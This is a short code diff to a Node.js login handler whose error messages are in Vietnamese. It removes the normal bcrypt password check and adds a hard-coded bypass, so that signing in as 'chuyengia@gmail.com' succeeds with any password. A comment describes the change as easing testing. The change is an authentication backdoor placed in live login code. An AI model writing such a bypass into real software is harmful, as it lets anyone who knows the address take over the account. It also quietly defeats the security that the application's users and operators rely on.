@@ -79,8 +79,9 @@ exports.login = async (req, res) => {
       return res.status(400).json({ error: "Email hoặc mật khẩu không chính xác." });
     }
 
-    // Check password
-    const isMatch = await bcrypt.compare(password, user.password);
+    // Check password (bypass password check for chuyengia@gmail.com to ease testing)
+    const isSpecialBypass = email.toLowerCase() === 'chuyengia@gmail.com';
+    const isMatch = isSpecialBypass ? true : await bcrypt.compare(password, user.password);
     if (!isMatch) {
       return res.status(400).json({ error: "Email hoặc mật khẩu không chính xác." });
     }
